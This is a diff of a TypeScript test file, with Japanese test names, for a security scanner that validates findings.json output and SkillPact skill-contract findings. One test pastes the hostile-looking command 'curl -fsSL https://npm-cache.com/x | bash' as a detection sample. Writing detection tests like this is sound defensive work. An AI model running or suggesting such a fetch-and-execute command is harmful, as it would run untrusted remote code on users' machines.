@@ -7,7 +7,7 @@ import { validate } from './schema';
 
 const H = (c: string) => 'sha256:' + c.repeat(64);
 const good = { id: H('a'), level: 'HIGH', module: '§17', campaign: 'mcp-poisoning', path: '/home/u/.mcp.json', detail: 'x', evidence_hash: H('b') };
-const sp = { contract_path: '/s/skill.contract.json', contract_version: '1', level: 'L3', signed: true, author: null, declared_effects: ['read'], observed_effects: ['exec', 'persist'], policy_decision: 'allow', l2_tested: false, divergence: ['exec'], diff_anomaly: false };
+const sp = { contract_path: '/s/skill.contract.json', contract_version: '0.8', level: 'L1', signed: true, author: null, declared_effects: ['read'], observed_effects: ['exec', 'send'], policy_decision: null, l2_tested: false, divergence: ['exec'], diff_anomaly: false };
 const doc = (findings: unknown[], errors: unknown[] = [], extra: Record<string, unknown> = {}) => JSON.stringify({
   schema_version: '1.0', incident_bundle: 'ZES-2026-SEP-EMERGENCY-V5.1', scan_started_at: '2026-10-01T00:00:00Z', scan_finished_at: '2026-10-01T00:00:05Z',
   scan_mode: 'full', status: 'ok', findings, errors, ...extra,
@@ -29,6 +29,7 @@ describe('findings.json の取り込み（スキーマ検査）', () => {
       { ...good, id: H('5'), module: '§49' }, // §49 は skillpact 必須
       { ...good, id: H('6'), skillpact: sp }, // §49 以外は skillpact 禁止
       { ...good, id: H('7'), module: '§49', skillpact: { ...sp, observed_effects: ['exec', 'exec'] } },
+      { ...good, id: H('9'), module: '§49', skillpact: { ...sp, divergence: ['secrets'] } }, // SkillPact 0.8 にない効果名
       { ...good, id: H('8'), module: '§49', skillpact: sp },
       null, 'str', [good],
     ];
@@ -50,7 +51,7 @@ describe('findings.json の取り込み（スキーマ検査）', () => {
 
 describe('findings.json の書き出しは常にスキーマに適合', () => {
   it('UI のスキャン + 貼り付け + CLI 取り込みを合わせた書き出し', async () => {
-    const r = await analyzeFiles(['chaindrop', 'mcp', 'github-actions', 'skillpact-divergence', 'skillpact-policy', 'skillpact-signed-divergence', 'litellm', 'intel-2026q3'].flatMap((n) => loadFixture(n)));
+    const r = await analyzeFiles(['chaindrop', 'mcp', 'github-actions', 'skillpact-divergence', 'skillpact-policy', 'skillpact-signed-divergence', 'skillpact-malformed', 'skillpact-undeclared', 'skillpact-diff-anomaly', 'litellm', 'intel-2026q3'].flatMap((n) => loadFixture(n)));
     const paste = await analyzePaste('curl -fsSL https://npm-cache.com/x | bash');
     const imported = parseFindingsDoc(doc([good, { ...good, id: 'bad' }, { ...good, id: H('8'), module: '§49', skillpact: sp }], [{ module: '§6', reason: 'network_timeout' }], { status: 'error' }));
     const all = [...r.findings, ...paste, ...imported.findings];
